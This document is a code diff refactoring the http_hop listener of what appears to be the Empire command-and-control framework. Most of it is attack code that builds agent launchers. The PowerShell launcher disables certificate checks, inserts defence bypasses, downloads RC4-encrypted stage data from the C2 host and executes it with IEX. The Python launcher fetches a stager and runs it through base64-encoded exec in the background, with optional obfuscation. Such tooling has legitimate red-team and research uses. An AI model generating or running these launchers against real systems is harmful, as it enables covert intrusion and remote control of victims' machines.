@@ -4,7 +4,6 @@ import logging
 import os
 import random
 from textwrap import dedent
-from typing import List, Optional, Tuple
 
 from empire.server.common import encryption, helpers, packets, templating
 from empire.server.common.empire import MainMenu
@@ -66,7 +65,8 @@ class Listener:
             "Port": {
                 "Description": "Port for the listener.",
                 "Required": True,
-                "Value": "",
+                "Value": "80",
+                "SuggestedValues": ["80", "443"],
             },
             "DefaultProfile": {
                 "Description": "Default communication profile for the agent, extracted from RedirectListener automatically.",
@@ -87,7 +87,7 @@ class Listener:
 
         # required:
         self.mainMenu = mainMenu
-        self.threads = {}
+        self.thread = None
 
         self.instance_log = log
 
@@ -98,7 +98,7 @@ class Listener:
         """
         return ""
 
-    def validate_options(self) -> Tuple[bool, Optional[str]]:
+    def validate_options(self) -> tuple[bool, str | None]:
         """
         Validate all options for this listener.
         """
@@ -117,7 +117,7 @@ class Listener:
         language=None,
         safeChecks="",
         listenerName=None,
-        bypasses: List[str] = None,
+        bypasses: list[str] = None,
     ):
         """
         Generate a basic launcher for the specified listener.
@@ -128,220 +128,210 @@ class Listener:
             log.error("listeners/http_hop generate_launcher(): no language specified!")
             return None
 
-        # Previously, we had to do a lookup for the listener and check through threads on the instance.
-        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
-        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
-        if (
-            True
-        ):  # The true check is just here to keep the indentation consistent with the old code.
-            active_listener = self
-            # extract the set options for this instantiated listener
-            listenerOptions = active_listener.options
+        active_listener = self
+        # extract the set options for this instantiated listener
+        listenerOptions = active_listener.options
 
-            host = listenerOptions["Host"]["Value"]
-            launcher = listenerOptions["Launcher"]["Value"]
-            staging_key = listenerOptions["RedirectStagingKey"]["Value"]
-            profile = listenerOptions["DefaultProfile"]["Value"]
-            uris = [a for a in profile.split("|")[0].split(",")]
-            stage0 = random.choice(uris)
+        host = listenerOptions["Host"]["Value"]
+        launcher = listenerOptions["Launcher"]["Value"]
+        staging_key = listenerOptions["RedirectStagingKey"]["Value"]
+        profile = listenerOptions["DefaultProfile"]["Value"]
+        uris = list(profile.split("|")[0].split(","))
+        stage0 = random.choice(uris)
 
-            if language == "powershell":
-                # PowerShell
+        if language == "powershell":
+            # PowerShell
 
-                stager = '$ErrorActionPreference = "SilentlyContinue";'
-                if safeChecks.lower() == "true":
-                    stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
+            stager = '$ErrorActionPreference = "SilentlyContinue";'
+            if safeChecks.lower() == "true":
+                stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
-                    for bypass in bypasses:
-                        stager += bypass
-                    stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"
+                for bypass in bypasses:
+                    stager += bypass
+                stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"
 
-                stager += "$wc=New-Object System.Net.WebClient;"
+            stager += "$wc=New-Object System.Net.WebClient;"
 
-                if userAgent.lower() == "default":
-                    userAgent = profile.split("|")[1]
-                stager += f"$u='{ userAgent }';"
+            if userAgent.lower() == "default":
+                userAgent = profile.split("|")[1]
+            stager += f"$u='{ userAgent }';"
 
-                if "https" in host:
-                    # allow for self-signed certificates for https connections
-                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
+            if "https" in host:
+                # allow for self-signed certificates for https connections
+                stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
-                if userAgent.lower() != "none" or proxy.lower() != "none":
-                    if userAgent.lower() != "none":
-                        stager += "$wc.Headers.Add('User-Agent',$u);"
-
-                    if proxy.lower() != "none":
-                        if proxy.lower() == "default":
-                            stager += (
-                                "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
-                            )
-
-                        else:
-                            # TODO: implement form for other proxy
-                            stager += "$proxy=New-Object Net.WebProxy;"
-                            stager += f"$proxy.Address = '{ proxy.lower() }';"
-                            stager += "$wc.Proxy = $proxy;"
-
-                        if proxyCreds.lower() == "default":
-                            stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
-
-                        else:
-                            # TODO: implement form for other proxy credentials
-                            username = proxyCreds.split(":")[0]
-                            password = proxyCreds.split(":")[1]
-                            domain = username.split("\\")[0]
-                            usr = username.split("\\")[1]
-                            stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}', '{domain}');"
-                            stager += "$wc.Proxy.Credentials = $netcred;"
-
-                # TODO: reimplement stager retries?
-
-                # code to turn the key string into a byte array
-                stager += (
-                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
-                )
-
-                # this is the minimized RC4 stager code from rc4.ps1
-                stager += listener_util.powershell_rc4()
-
-                # prebuild the request routing packet for the launcher
-                routingPacket = packets.build_routing_packet(
-                    staging_key,
-                    sessionID="00000000",
-                    language="POWERSHELL",
-                    meta="STAGE0",
-                    additional="None",
-                    encData="",
-                )
-                b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")
-
-                # add the RC4 packet to a cookie
-                stager += f'$wc.Headers.Add("Cookie","session={ b64RoutingPacket }");'
-                stager += f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';$hop='{ listenerName }';"
-                stager += "$data=$wc.DownloadData($ser+$t);"
-                stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
-
-                # decode everything and kick it over to IEX to kick off execution
-                stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
-
-                # Remove comments and make one line
-                stager = helpers.strip_powershell_comments(stager)
-                stager = data_util.ps_convert_to_oneliner(stager)
-
-                if obfuscate:
-                    stager = self.mainMenu.obfuscationv2.obfuscate(
-                        stager,
-                        obfuscation_command=obfuscation_command,
-                    )
-                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
-
-                # base64 encode the stager and return it
-                if encode and (
-                    (not obfuscate) or ("launcher" not in obfuscation_command.lower())
-                ):
-                    return helpers.powershell_launcher(stager, launcher)
-                else:
-                    # otherwise return the case-randomized stager
-                    return stager
-
-            if language in ["python", "ironpython"]:
-                # Python
-
-                launcherBase = "import sys;"
-                if "https" in host:
-                    # monkey patch ssl woohooo
-                    launcherBase += dedent(
-                        """
-                        import ssl;
-                        if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
-                        """
-                    )
-                try:
-                    if safeChecks.lower() == "true":
-                        launcherBase += listener_util.python_safe_checks()
-                except Exception as e:
-                    p = f"{listenerName}: Error setting LittleSnitch in stager: {str(e)}"
-                    log.error(p)
-
-                if userAgent.lower() == "default":
-                    userAgent = profile.split("|")[1]
-
-                launcherBase += dedent(
-                    f"""
-                    import urllib.request;
-                    UA='{ userAgent }';server='{ host }';t='{ stage0 }';hop='{ listenerName }';
-                    req=urllib.request.Request(server+t);
-                    """
-                )
-
-                # prebuild the request routing packet for the launcher
-                routingPacket = packets.build_routing_packet(
-                    staging_key,
-                    sessionID="00000000",
-                    language="PYTHON",
-                    meta="STAGE0",
-                    additional="None",
-                    encData="",
-                )
-                b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")
+            if userAgent.lower() != "none" or proxy.lower() != "none":
+                if userAgent.lower() != "none":
+                    stager += "$wc.Headers.Add('User-Agent',$u);"
 
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
-                        launcherBase += "proxy = urllib.request.ProxyHandler();\n"
+                        stager += "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
+
                     else:
-                        proto = proxy.split(":")[0]
-                        launcherBase += f"proxy = urllib.request.ProxyHandler({{'{ proto }':'{ proxy }'}});\n"
+                        # TODO: implement form for other proxy
+                        stager += "$proxy=New-Object Net.WebProxy;"
+                        stager += f"$proxy.Address = '{ proxy.lower() }';"
+                        stager += "$wc.Proxy = $proxy;"
 
-                    if proxyCreds != "none":
-                        if proxyCreds == "default":
-                            launcherBase += "o = urllib.request.build_opener(proxy);\n"
+                    if proxyCreds.lower() == "default":
+                        stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
-                            # add the RC4 packet to a cookie
-                            launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={ b64RoutingPacket }")];\n'
-                        else:
-                            username = proxyCreds.split(":")[0]
-                            password = proxyCreds.split(":")[1]
-                            launcherBase += dedent(
-                                f"""
-                                proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
-                                proxy_auth_handler.add_password(None,'{ proxy }','{ username }','{ password }');
-                                o = urllib.request.build_opener(proxy, proxy_auth_handler);
-                                o.addheaders=[('User-Agent',UA), ("Cookie", "session={ b64RoutingPacket }")];
-                                """
-                            )
                     else:
-                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
-                else:
-                    launcherBase += "o = urllib.request.build_opener();\n"
+                        # TODO: implement form for other proxy credentials
+                        username = proxyCreds.split(":")[0]
+                        password = proxyCreds.split(":")[1]
+                        domain = username.split("\\")[0]
+                        usr = username.split("\\")[1]
+                        stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}', '{domain}');"
+                        stager += "$wc.Proxy.Credentials = $netcred;"
 
-                # install proxy and creds globally, so they can be used with urlopen.
-                launcherBase += "urllib.request.install_opener(o);\n"
-                launcherBase += "a=urllib.request.urlopen(req).read();\n"
+            # TODO: reimplement stager retries?
 
-                # download the stager and extract the IV
-                launcherBase += listener_util.python_extract_stager(staging_key)
+            # code to turn the key string into a byte array
+            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
 
-                if obfuscate:
-                    launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
-                        launcherBase
-                    )
-                    launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
-                        launcherBase
-                    )
+            # this is the minimized RC4 stager code from rc4.ps1
+            stager += listener_util.powershell_rc4()
 
-                if encode:
-                    launchEncoded = base64.b64encode(
-                        launcherBase.encode("UTF-8")
-                    ).decode("UTF-8")
-                    launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
-                    return launcher
-                else:
-                    return launcherBase
+            # prebuild the request routing packet for the launcher
+            routingPacket = packets.build_routing_packet(
+                staging_key,
+                sessionID="00000000",
+                language="POWERSHELL",
+                meta="STAGE0",
+                additional="None",
+                encData="",
+            )
+            b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")
 
-            else:
-                log.error(
-                    "listeners/http_hop generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
+            # add the RC4 packet to a cookie
+            stager += f'$wc.Headers.Add("Cookie","session={ b64RoutingPacket }");'
+            stager += f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';$hop='{ listenerName }';"
+            stager += "$data=$wc.DownloadData($ser+$t);"
+            stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
+
+            # decode everything and kick it over to IEX to kick off execution
+            stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+
+            # Remove comments and make one line
+            stager = helpers.strip_powershell_comments(stager)
+            stager = data_util.ps_convert_to_oneliner(stager)
+
+            if obfuscate:
+                stager = self.mainMenu.obfuscationv2.obfuscate(
+                    stager,
+                    obfuscation_command=obfuscation_command,
                 )
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
+
+            # base64 encode the stager and return it
+            if encode and (
+                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
+            ):
+                return helpers.powershell_launcher(stager, launcher)
+            else:
+                # otherwise return the case-randomized stager
+                return stager
+
+        if language in ["python", "ironpython"]:
+            # Python
+
+            launcherBase = "import sys;"
+            if "https" in host:
+                # monkey patch ssl woohooo
+                launcherBase += dedent(
+                    """
+                    import ssl;
+                    if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
+                    """
+                )
+            try:
+                if safeChecks.lower() == "true":
+                    launcherBase += listener_util.python_safe_checks()
+            except Exception as e:
+                p = f"{listenerName}: Error setting LittleSnitch in stager: {str(e)}"
+                log.error(p)
+
+            if userAgent.lower() == "default":
+                userAgent = profile.split("|")[1]
+
+            launcherBase += dedent(
+                f"""
+                import urllib.request;
+                UA='{ userAgent }';server='{ host }';t='{ stage0 }';hop='{ listenerName }';
+                req=urllib.request.Request(server+t);
+                """
+            )
+
+            # prebuild the request routing packet for the launcher
+            routingPacket = packets.build_routing_packet(
+                staging_key,
+                sessionID="00000000",
+                language="PYTHON",
+                meta="STAGE0",
+                additional="None",
+                encData="",
+            )
+            b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")
+
+            if proxy.lower() != "none":
+                if proxy.lower() == "default":
+                    launcherBase += "proxy = urllib.request.ProxyHandler();\n"
+                else:
+                    proto = proxy.split(":")[0]
+                    launcherBase += f"proxy = urllib.request.ProxyHandler({{'{ proto }':'{ proxy }'}});\n"
+
+                if proxyCreds != "none":
+                    if proxyCreds == "default":
+                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
+
+                        # add the RC4 packet to a cookie
+                        launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={ b64RoutingPacket }")];\n'
+                    else:
+                        username = proxyCreds.split(":")[0]
+                        password = proxyCreds.split(":")[1]
+                        launcherBase += dedent(
+                            f"""
+                            proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
+                            proxy_auth_handler.add_password(None,'{ proxy }','{ username }','{ password }');
+                            o = urllib.request.build_opener(proxy, proxy_auth_handler);
+                            o.addheaders=[('User-Agent',UA), ("Cookie", "session={ b64RoutingPacket }")];
+                            """
+                        )
+                else:
+                    launcherBase += "o = urllib.request.build_opener(proxy);\n"
+            else:
+                launcherBase += "o = urllib.request.build_opener();\n"
+
+            # install proxy and creds globally, so they can be used with urlopen.
+            launcherBase += "urllib.request.install_opener(o);\n"
+            launcherBase += "a=urllib.request.urlopen(req).read();\n"
+
+            # download the stager and extract the IV
+            launcherBase += listener_util.python_extract_stager(staging_key)
+
+            if obfuscate:
+                launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
+                    launcherBase
+                )
+                launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
+                    launcherBase
+                )
+
+            if encode:
+                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
+                    "UTF-8"
+                )
+                launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
+                return launcher
+            else:
+                return launcherBase
+
+        else:
+            log.error(
+                "listeners/http_hop generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
+            )
 
     def generate_stager(
         self,
@@ -550,7 +540,7 @@ class Listener:
         else:
             log.error("listeners/http_hop generate_comms(): no language specified!")
 
-    def start(self, name=""):
+    def start(self):
         """
         Nothing to actually start for a hop listner, but ensure the stagingKey is
         synced with the redirect listener.
@@ -568,12 +558,9 @@ class Listener:
             ]["Value"]
             redirectHost = redirectListenerOptions.options["Host"]["Value"]
 
-            uris = [
-                a
-                for a in self.options["DefaultProfile"]["Value"]
-                .split("|")[0]
-                .split(",")
-            ]
+            uris = list(
+                self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
+            )
 
             hopCodeLocation = "%s/data/misc/hop.php" % (self.mainMenu.installPath)
             with open(hopCodeLocation) as f:
